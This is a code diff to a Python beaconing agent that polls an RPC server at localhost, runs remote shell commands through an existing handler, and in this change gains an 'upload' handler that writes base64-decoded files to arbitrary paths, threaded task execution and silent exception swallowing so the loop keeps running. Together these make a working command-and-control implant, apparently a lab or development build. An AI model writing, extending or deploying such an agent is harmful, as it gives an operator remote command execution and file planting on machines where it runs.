@@ -1,9 +1,12 @@
 import requests
+import os
 import time
+import threading
 import uuid
 import json
 import socket
 import subprocess
+import base64
 
 SERVER = "http://127.0.0.1:8000/rpc"
 MAX_BACKOFF = 15
@@ -17,7 +20,8 @@ class Agent:
 
         self.handlers = {
             "shell": self.handle_shell,
-            "health": self.handle_health
+            "health": self.handle_health,
+            "upload": self.handle_upload,
         }
 
     def rpc(self, method, **params):
@@ -84,6 +88,17 @@ class Agent:
             stderr = result.stderr,
             exit_code = result.returncode
         )
+    
+    def handle_upload(self, params):
+        path = params.get("path")
+        data = params.get("data")
+
+        os.makedirs(os.path.dirname(os.path.abspath(path)), exist_ok=True)
+
+        with open(path, "wb") as f:
+            f.write(base64.b64decode(data))
+            
+        return self.result(stdout=f"written: {path}")
 
     def handle_health(self, params):
         return self.result(
@@ -125,58 +140,59 @@ class Agent:
         )
 
     def execute_task(self, task):
-        if not task:
-            return
-        
-        task_id = task.get("id")
-        method = task.get("method")
-        params = task.get("params", {})
-
-        handler = self.handlers.get(method)
-
-        if not handler:
-            self.send_result(
-                task_id, 
-                "error",
-                self.result(
-                    stderr="method not found",
-                    exit_code=1
-                )
-            )
-            return
-        
         try:
-            output = handler(params)
-            status = "ok"
+            task_id = task.get("id")
+            method = task.get("method")
+            params = task.get("params", {})
 
-        except Exception as e:
-            output = self.result(
-                stderr = str(e), 
-                exit_code = -1
-            )
-            status = "error"
+            handler = self.handlers.get(method)
+            if not handler:
+                self.send_result(
+                    task_id, 
+                    "error",
+                    self.result(stderr="method not found", exit_code=1)
+                )
+                return
+            
+            try:
+                output = handler(params)
+                status = "ok"
+            except Exception as e:
+                output = self.result(stderr = str(e), exit_code = -1)
+                status = "error"
 
-        self.send_result(task_id, status, output)
+            self.send_result(task_id, status, output)
+        
+        except Exception:
+            pass
 
     def run(self):
-        while not self.identify():
-            time.sleep(5)
-        
-        print(f"[+] identified as {self.client_id}")
+        while True:
+            try:
+                if self.identify():
+                    break
+            except Exception:
+                pass
 
+            time.sleep(5)
+               
+        print(f"[+] identified as {self.client_id}") # DEBUG
         backoff = 1
 
         while True:
             try:
                 result = self.beacon()
-
-                if result:
-                    self.execute_task(result.get("task"))
+                if result and result.get("task"):
+                    threading.Thread(
+                        target=self.execute_task,
+                        args=(result["task"],),
+                        daemon=True
+                    ).start()
                 
                 backoff = 1
                 time.sleep(5)
 
-            except (requests.RequestException, ValueError):
+            except Exception:
                 time.sleep(backoff)
                 backoff = min(backoff + 1, MAX_BACKOFF)
 
